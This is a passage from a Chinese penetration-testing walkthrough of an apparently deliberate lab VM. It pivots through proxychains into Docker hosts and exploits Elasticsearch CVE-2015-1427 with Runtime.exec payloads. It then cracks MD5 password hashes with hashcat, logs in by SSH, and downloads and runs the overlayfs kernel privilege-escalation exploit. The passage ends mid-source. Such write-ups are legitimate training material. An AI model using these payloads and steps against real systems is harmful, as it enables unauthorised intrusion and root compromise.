命令做了内网主机发现，当时发现 172.17.0.1 是存活主机。借鉴在 vmware 虚拟网络中，x.x.x.1 往往代表着宿主机，这里先对 172.17.0.1 进行测试，看看它身上有没有什么有价值的信息。</p><p><strong>使用 nmap 扫描内网地址：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT 172.17.0.1</span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27; and scan times will be slower.<br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-01 21:59 EDT<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:993 &lt;--socket error or timeout!<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:443 &lt;--socket error or timeout!<br>[......]<br>Nmap scan report for 172.17.0.1 (172.17.0.1)<br>Host is up (0.012s latency).<br>Not shown: 998 closed ports<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>5000/tcp open  upnp<br><br>Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT -sV -p22,5000 172.17.0.1</span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27; and scan times will be slower.<br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-01 22:02 EDT<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:22  ...  OK<br>[......]<br>Nmap scan report for 172.17.0.1 (172.17.0.1)<br>Host is up (0.012s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)<br>5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 15.10 seconds<br></code></pre></td></tr></table></figure><p>它也开放着 22 和 5000 端口，给 kali 的浏览器配置 socks5 代理，看看这个 172.17.0.1 的 5000 端口是什么，发现和 docker 1 一样。</p><p>M1 直接给 kali 的浏览器配置代理：设置里配置代理</p><p>M2 使用 proxychains4 给 firefox 配置代理：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 firefox</span><br></code></pre></td></tr></table></figure><p>M3 使用 curl：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl http://172.17.0.1:5000</span><br><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl http://172.17.0.1:5000/admin</span><br></code></pre></td></tr></table></figure><p>这意味着，172.17.0.1 是192.168.135.151 的宿主机，只不过 172.17.0.1 是宿主机面向内网的 ip。</p><blockquote><p>如果这让你感到难以理解，可以换个说法，你一定碰到过这中情况，你希望把自己物理机上的某个文件丢到虚拟机中，但是 vmware-tools 失效了，你无法直接把文件拖动到虚拟机里面。于是你在物理机上使用 python 或者别的什么工具开启了一个 web 服务，然后你在虚拟机就可以下载文件了。但是你在虚拟机的浏览器中输入的，一定是 x.x.x.1，因为这个地址才是物理机可以与虚拟机交互的地址。</p></blockquote><p>考虑到当初拿 shell 的时候，就没看到什么有价值的信息，估计就算拿下 172.17.0.1 也是如此。在主机发现的时候，172.17.0.2 也是存活主机，看看它有没有什么有趣的信息。</p><p><strong>扫描其他主机：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT 172.17.0.2</span><br>Nmap scan report for 172.17.0.2 (172.17.0.2)<br>Host is up (0.0096s latency).<br>Not shown: 999 closed ports<br>PORT     STATE SERVICE<br>9200/tcp open  wap-wsp<br><br>Nmap done: 1 IP address (1 host up) scanned in 14.08 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT -sV -p9200 172.17.0.2</span><br>Nmap scan report for 172.17.0.2<br>Host is up (0.014s latency).<br><br>PORT     STATE SERVICE VERSION<br>9200/tcp open  http    Elasticsearch REST API 1.4.2 (name: Damon Dran; cluster: elasticsearch; Lucene 4.10.2)<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 24.84 seconds<br></code></pre></td></tr></table></figure><p>发现这个 ip 上跑着 Elasticsearch 服务，百度一下发现这个服务曾经爆出过 RCE 漏洞，那我们就试试，看能不能拿下这台主机。</p><h4 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h4><p>搜索漏洞库，发现存在 RCE 利用文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit Elasticsearch</span><br>----------------------- ---------------------------------<br> Exploit Title         |  Path<br>----------------------- ---------------------------------<br>ElasticSearch - Remote | linux/remote/36337.py<br>ElasticSearch - Remote | multiple/webapps/33370.html<br>----------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cp /usr/share/exploitdb/exploits/linux/remote/36337.py ./</span><br></code></pre></td></tr></table></figure><p>看了下代码，发现是 python2 写的，运行脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 python2 36337.py 172.17.0.2</span>  <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>                                                                       <br> Exploit for ElasticSearch , CVE-2015-1427   Version: 20150309.1                                                         <br>&#123;*&#125; Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something<br><span class="hljs-meta">~$</span><span class="bash"> id</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>Traceback (most recent call last):<br>  File &quot;36337.py&quot;, line 56, in &lt;module&gt;<br>    main(args=sys.argv)<br>  File &quot;36337.py&quot;, line 53, in main<br>    exploit(target=args[1])<br>  File &quot;36337.py&quot;, line 47, in exploit<br>    execute_command(target=target, command=cmd)<br>  File &quot;36337.py&quot;, line 36, in execute_command<br>    fuckingjson = values[&#x27;hits&#x27;][&#x27;hits&#x27;][0][&#x27;fields&#x27;][&#x27;lupin&#x27;][0]<br>IndexError: list index out of range<br></code></pre></td></tr></table></figure><h4 id="利用失败"><a href="#利用失败" class="headerlink" title="利用失败"></a>利用失败</h4><blockquote><p>原文链接：<a href="https://blog.csdn.net/GALi_233/article/details/119841078">https://blog.csdn.net/GALi_233/article/details/119841078</a></p></blockquote><p>尝试利用，发现失败，随后我又通过 MSF 的 exp 进行利用，也失败，于是又手动提交 payload 发现还是不行 。</p><p>该漏洞利用需要至少一条数据，否则无法利用成功，原因是服务里面没有数据，所以不能通过 search 来搜索进而执行命令，</p><p>插入一条数据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl -X POST <span class="hljs-string">&#x27;http://172.17.0.3:9200/doc/test&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;name&quot; : &quot;test&quot;&#125;&#x27;</span></span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;&quot;_index&quot;:&quot;doc&quot;,&quot;_type&quot;:&quot;test&quot;,&quot;_id&quot;:&quot;AYHDq6TBj_Czxl86lzH3&quot;,&quot;_version&quot;:1,&quot;created&quot;:true&#125;<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains curl -XPOST <span class="hljs-string">&#x27;http://172.17.0.3:9200/twitter/user/yren&#x27;</span> -d <span class="hljs-string">&#x27;&#123; &quot;name&quot; : &quot;Wu&quot; &#125;&#x27;</span></span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;&quot;_index&quot;:&quot;twitter&quot;,&quot;_type&quot;:&quot;user&quot;,&quot;_id&quot;:&quot;yren&quot;,&quot;_version&quot;:1,&quot;created&quot;:true&#125;    <br></code></pre></td></tr></table></figure><p>再次执行 Payload，成功执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl -XPOST <span class="hljs-string">&#x27;http://172.17.0.3:9200/_search?pretty&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;script_fields&quot;: &#123;&quot;payload&quot;: &#123;&quot;script&quot;:&quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;whoami\&quot;).getText()&quot;&#125;&#125;&#125;&#x27;</span></span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;<br>  &quot;took&quot; : 9,<br>  &quot;timed_out&quot; : false,<br>  &quot;_shards&quot; : &#123;<br>    &quot;total&quot; : 10,<br>    &quot;successful&quot; : 10,<br>    &quot;failed&quot; : 0<br>  &#125;,<br>  &quot;hits&quot; : &#123;<br>    &quot;total&quot; : 2,<br>    &quot;max_score&quot; : 1.0,<br>    &quot;hits&quot; : [ &#123;<br>      &quot;_index&quot; : &quot;twitter&quot;,<br>      &quot;_type&quot; : &quot;user&quot;,<br>      &quot;_id&quot; : &quot;yren&quot;,<br>      &quot;_score&quot; : 1.0,<br>      &quot;fields&quot; : &#123;<br>        &quot;payload&quot; : [ &quot;root\n&quot; ]<br>      &#125;<br>    &#125;, &#123;<br>      &quot;_index&quot; : &quot;doc&quot;,<br>      &quot;_type&quot; : &quot;test&quot;,<br>      &quot;_id&quot; : &quot;AYHDq6TBj_Czxl86lzH3&quot;,<br>      &quot;_score&quot; : 1.0,<br>      &quot;fields&quot; : &#123;<br>        &quot;payload&quot; : [ &quot;root\n&quot; ]<br>      &#125;<br>    &#125; ]<br>  &#125;<br>&#125;<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl -XPOST <span class="hljs-string">&#x27;http://172.17.0.3:9200/_search?pretty&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;whoami\&quot;).getText()&quot;&#125;&#125;&#125;&#x27;</span></span>   <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;<br>  &quot;took&quot; : 60,<br>  &quot;timed_out&quot; : false,<br>  &quot;_shards&quot; : &#123;<br>    &quot;total&quot; : 10,<br>    &quot;successful&quot; : 10,<br>    &quot;failed&quot; : 0<br>  &#125;,<br>  &quot;hits&quot; : &#123;<br>    &quot;total&quot; : 2,<br>    &quot;max_score&quot; : 1.0,<br>    &quot;hits&quot; : [ &#123;<br>      &quot;_index&quot; : &quot;twitter&quot;,<br>      &quot;_type&quot; : &quot;user&quot;,<br>      &quot;_id&quot; : &quot;yren&quot;,<br>      &quot;_score&quot; : 1.0,<br>      &quot;fields&quot; : &#123;<br>        &quot;lupin&quot; : [ &quot;root\n&quot; ]<br>      &#125;<br>    &#125; ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再次尝试 RCE 脚本，成功了。这次依然拿到的是 docker 2 的 root 权限，检查发现 passwords 文件 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 python2 36337.py 172.17.0.2</span>                                                 <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br><br> Exploit for ElasticSearch , CVE-2015-1427   Version: 20150309.1                                                         <br>&#123;*&#125; Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something<br><span class="hljs-meta">~$</span><span class="bash"> id</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">~$</span><span class="bash"> whoami</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>root<br><span class="hljs-meta">~$</span><span class="bash"> ls</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>[......]<br>passwords<br>[......]<br><span class="hljs-meta">~$</span><span class="bash"> cat passwords</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>Format: number,number,number,number,lowercase,lowercase,lowercase,lowercase<br>Example: 1234abcd<br>john:3f8184a7343664553fcb5337a3138814 <br>test:861f194e9d6118f3d942a72be3e51749<br>admin:670c3bbc209a18dde5446e5e6c1f1d5b<br>root:b3d34352fc26117979deabdf1b9b6354<br>jane:5c158b60ed97c723b673529b8a3cf72b<br></code></pre></td></tr></table></figure><p>提示我们使用 hashcat 破解 hash 值，Format 就是模板，先把 hash 提取出来，保存为一个文件 。</p><p>Hashcat 破解：</p><blockquote><p><a href="https://www.freebuf.com/sectool/164507.html">密码破解全能工具：Hashcat密码破解攻略 - FreeBuf网络安全行业门户</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat pwd.hash</span> <br>3f8184a7343664553fcb5337a3138814<br>861f194e9d6118f3d942a72be3e51749<br>670c3bbc209a18dde5446e5e6c1f1d5b<br>b3d34352fc26117979deabdf1b9b6354<br>5c158b60ed97c723b673529b8a3cf72b                                                                                                                                            <br><span class="hljs-meta">#</span><span class="bash"> -m 0 指哈希类型是md5 ， -a 3 指掩码攻击，根据提示，前四位为数字，后四位为小写字母，?d代表数字，?l代表小写字母</span><br><span class="hljs-meta">$</span><span class="bash"> hashcat -m 0 -a 3 pwd.hash ?d?d?d?d?l?l?l?l --force</span><br>hashcat (v6.1.1) starting...<br><br>5c158b60ed97c723b673529b8a3cf72b:1234jane        <br>b3d34352fc26117979deabdf1b9b6354:1234pass        <br>670c3bbc209a18dde5446e5e6c1f1d5b:1111pass        <br>3f8184a7343664553fcb5337a3138814:1337hack        <br>861f194e9d6118f3d942a72be3e51749:1234test      <br></code></pre></td></tr></table></figure><p>很快就破解出来了：</p><blockquote><p>网站破解：<a href="https://crackstation.net/">https://crackstation.net/</a> or <a href="https://www.somd5.com/">https://www.somd5.com/</a></p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css">Format: number,number,number,number,lowercase,lowercase,lowercase,lowercase<br>Example: <span class="hljs-number">1234</span>abcd<br>john:<span class="hljs-number">3</span>f8184a7343664553fcb5337a3138814:<span class="hljs-number">1337</span>hack<br>test:<span class="hljs-number">861</span>f194e9d6118f3d942a72be3e51749:<span class="hljs-number">1234</span>test<br>admin:<span class="hljs-number">670</span>c3bbc209a18dde5446e5e6c1f1d5b:<span class="hljs-number">1111</span>pass<br>root:b3d34352fc26117979deabdf1b9b6354:<span class="hljs-number">1234</span>pass<br>jane:<span class="hljs-number">5</span>c158b60ed97c723b673529b8a3cf72b:<span class="hljs-number">1234</span>jane<br></code></pre></td></tr></table></figure><h4 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h4><p>经过测试，只有 john 可以登录。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh john@192.168.135.151</span>         <br>john@192.168.135.151&#x27;s password: <br>Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)<br><br>john@socnet:~$ whoami<br>john<br>john@socnet:~$ id<br>uid=1001(john) gid=1001(john) groups=1001(john)<br></code></pre></td></tr></table></figure><p>查看 sudo：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ sudo -l<br>[sudo] password for john: <br>Sorry, user john may not run sudo on socnet.<br></code></pre></td></tr></table></figure><p>查看 SUID：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null</span><br><span class="hljs-meta">$</span><span class="bash"> find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> ls -ldb &#123;&#125; ;</span><br><br>john@socnet:~$ find / -perm -u=s -type f 2&gt;/dev/null<br>[......]<br>/usr/bin/chsh<br>/usr/bin/pkexec<br>/usr/bin/gpasswd<br>[......]<br></code></pre></td></tr></table></figure><p>查看 passwd：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>[......]<br>socnet:x:1000:1000:socnet,,,:/home/socnet:/bin/bash<br>john:x:1001:1001:john,,,:/home/john:/bin/bash<br></code></pre></td></tr></table></figure><h3 id="2、内核提权"><a href="#2、内核提权" class="headerlink" title="2、内核提权"></a>2、内核提权</h3><p>检查内核信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cat /etc/version<br>$ lsb_release -a<br>john@socnet:~$ uname -a<br>Linux socnet 3.13.0-24-generic <span class="hljs-comment">#46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><p>使用 searchsploit 看看有没有提权 EXP：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit linux 3.13.0 ubuntu Privilege Escalation</span><br>---------------------------------------------------------------------------------------------------------- -<br>Exploit Title                                                                                            |  Path<br>---------------------------------------------------------------------------------------------------------- -<br>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;overlayfs&#x27; Local Privilege Escalation      | linux/local/37292.c<br>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;overlayfs&#x27; Local Privilege Escalation (Acc | linux/local/37293.txt<br>Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.04/13.10 x64) - &#x27;CONFIG_X86_X32=y&#x27; Local Privilege Escalation (3)    | linux_x86-64/local/31347.c<br>Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                             | linux/local/45010.c<br>Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                    | linux/local/44298.c<br>Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - &#x27;netfilter target_offset&#x27; Local Privilege Escalation         | linux_x86-64/local/44300.c<br>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)     | linux/local/43418.c<br>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalatio | linux/local/47169.c<br>Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                    | linux/local/41760.txt<br>---------------------------------------------------------------------------------------------------------- -<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>选择 37292.c 来利用，查看靶机有没有 gcc：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ gcc --version<br>The program &#x27;gcc&#x27; is currently not installed. To run &#x27;gcc&#x27; please ask your administrator to install the package &#x27;gcc&#x27;<br></code></pre></td></tr></table></figure><p>发现没有 gcc ，尝试在本地编译之后再传至靶机：</p><blockquote><p>没有权限在线安装 gcc，也无法离线安装，没有 rpm 命令</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc 37292.c -o ofs</span>                                                                       <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span>      <br>Serving HTTP on 0.0.0.0 port 8888 ...<br>192.168.135.151 - - [02/Jul/2022 00:31:01] &quot;GET /ofs HTTP/1.1&quot; 200 -<br></code></pre></td></tr></table></figure><p>靶机下载、运行文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ wget http://192.168.135.141:8888/ofs<br><br>john@socnet:~$ ls<br>ofs<br>john@socnet:~$ ./ofs<br>-bash: ./ofs: Permission denied<br>john@socnet:~$ chmod +x ofs<br>john@socnet:~$ ./ofs<br>spawning threads<br>mount #1<br>mount #2<br>child threads done<br>/etc/ld.so.preload created<br>creating shared library<br>sh: 1: gcc: not found<br>couldn&#x27;t create dynamic library<br></code></pre></td></tr></table></figure><p>运行后发现 gcc 报错，也意味着代码中含有 gcc 命令，查看源码，发现执行了一条命令用来编译生成 ofs-lib.so 文件，然后往上找，可以找到 LIB 变量的内容 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LIB <span class="hljs-meta-string">&quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = 